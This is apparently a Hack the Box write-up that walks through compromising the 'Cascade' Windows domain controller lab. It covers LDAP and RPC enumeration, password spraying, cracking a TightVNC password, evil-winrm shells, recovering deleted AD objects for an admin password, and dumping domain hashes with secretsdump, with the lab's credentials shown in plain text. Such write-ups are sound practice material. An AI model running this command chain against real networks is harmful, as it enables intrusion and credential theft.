---
title: "Hack the Box - Cascade"
slug: "hack-the-box-cascade"
date: "2024-03-14"
excerpt: "Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user `r.thompson`, which gives access to a `TightVNC` registry backup. The backup is decrypted to gain the password for `s.smith`. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the `ArkSvc` account. This account belongs to the `AD Recycle Bin` group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator."
cover: "cover.png"
tags:
  - LDAP
  - TightVNC
  - Decompilation
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -Pn -oN scans/nmap.txt 10.10.10.182
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-11 10:42:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

We can see that the domain is `cascade.local` and the hostname is `casc-dc1`. Let's add these hostnames to `/etc/hosts`.

### RPC
We can authenticate via RPC with a null session.

```bash
rpcclient -U '' -N cascade.htb
```

We can use `enumdomusers` to get a list of users on the machine.

![](./20220811204308825.png)

Add these to a user list.

### LDAP
If we enumerate LDAP we find a password.

```bash
ldapsearch -x -H ldap://cascade.local -b 'DC=cascade,DC=local' | grep -i pwd
```

![](./20220811205708748.png)

We can identify the user it corresponds to.

```bash
ldapsearch -x -H ldap://cascade.local -b 'DC=cascade,DC=local' | grep -i cascadelegacypwd: -B 10
```

![](./20220811205829358.png)

It looks like base64, let's decode it.

```bash
echo 'clk0bjVldmE=' | base64 -d
```

```text
r.thompson:rY4n5eva
```

We can confirm these credentials are valid using `crackmapexec`.

```bash
crackmapexec smb cascade.local -u userlist.txt -p 'rY4n5eva' --shares
```

![](./20220811210501958.png)

### SMB
We're able to view some shares. We are only able to view the `IT ` directory. Let's download all files.

```bash
smbclient -U 'cascade.local/r.thompson%rY4n5eva' //cascade.local/Data
```

![](./20220811211243009.png)

### TightVNC
In the `/Temp/s.smith/` directory is a registry file for TightVNC which looks to contain an encoded password.

![](./20220811231123810.png)

It looks like there's a [GitHub repository]([jeroennijhof/vncpwd: VNC Password Decrypter (github.com)](https://github.com/jeroennijhof/vncpwd)) that has a tool to crack this password.

```bash
git clone https://github.com/jeroennijhof/vncpwd.git
cd vncpwd
gcc -o vncpwd vncpwd.c d3des.c 
```

Before we run it, we need to get the password into a format that is recognised.

```bash
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -r -p > encoded_tightvnc_password.txt
```

Now we can crack the password.

```bash
./vncpwd encoded_tightvnc_password.txt
```

![](./20220811231918544.png)

## Shell as s.smith
If we password spray once again, we find these credentials are valid for the user `s.smith`.

![](./20220811232013483.png)

```text
s.smith:sT333ve2
```

We can use `evil-winrm` to login.

```bash
evil-winrm -i cascade.local -u s.smith -p sT333ve2
```

![](./20220811232722899.png)

### User.txt

```powershell
cat user.txt;ipconfig
```

![](./20220811232826384.png)

## Shell as ArkSvc

### Bloodhound
Before moving on, let's dump domain objects and load up Bloodhound to help figure out where to move next.

```bash
bloodhound-python -c All -u s.smith -p 'sT333ve2' -d cascade.local -dc casc-dc1.cascade.local -ns 10.10.10.182
```

![](./20220811233307570.png)

Nothing seems to stick out, we can enumerate more on target itself.

### Users and Groups
If we enumerate `s.smith`'s user, we can see a few non standard groups.

![](./20220812000008284.png)

Looks like it gives permission to an Audit network share.

![](./20220812000040845.png)

### SMB
Looks like there is a .NET application.

```bash
smbclient -U 'cascade.local/s.smith%sT333ve2' //cascade.local/Audit\$
```

![](./20220812000413110.png)

### Source Code Analysis

In the `RunAudit.bat` file we can see that `CascAudit.exe` runs with arguments pointing to a database file.

![](./20220812002005765.png)

Let's load `CascAudit.exe` into dnSpy and take a look at the code.

![](./20220812002245327.png)

The important part of the code looks to be this snippet where the password is decrypted from the database.

![](./20220812003050567.png)

Let's try debugging the program and setting up a breakpoint so it doesn't error out when it realises it cannot connect to LDAP. Then we should be able to read all the variable values including the decrypted password.

Make sure to set an argument pointing to the `Audit.db` database file.

![](./20220812003222487.png)

Here we get a list of all the variables and their values.

![](./20220812003259407.png)

As we can see, we've also got the plaintext password for `ArkSvc`.

```text
arksvc:w3lc0meFr31nd
```

We're able to get a shell.

```bash
evil-winrm -i cascade.local -u arksvc -p w3lc0meFr31nd 
```

![](./20220812003453908.png)

## Shell as SYSTEM

### AD Recycle Bin
If we look at the groups membership for `ArkSvc` we see an interesting group `AD Recycle Bin`.

![](./20220812003647708.png)

With these permissions we are able to recover deleted AD domain objects. Let's have a look at them.

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

We're able to find a `TempAdmin` account with the `cascadeLegacyPwd` attribute set. We can decode it using base64.

![](./20220812004506697.png)

```bash
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
```

![](./20220812004548428.png)

The credentials are invalid for the `TempAdmin` account but are valid for the `Administrator` account.

```bash
crackmapexec smb cascade.local -u Administrator -p baCT3r1aN00dles
```

![](./20220812004642193.png)

### Shell
```bash
evil-winrm -i cascade.local -u Administrator -p baCT3r1aN00dles
```

![](./20220812004807552.png)

### Root.txt
```powershell
cat root.txt;ipconfig
```

![](./20220812004848713.png)

## Post Exploitation
```bash
impacket-secretsdump 'cascade.local/Administrator:baCT3r1aN00dles'@cascade.local -outputfile hashes
```

![](./20220812005134689.png)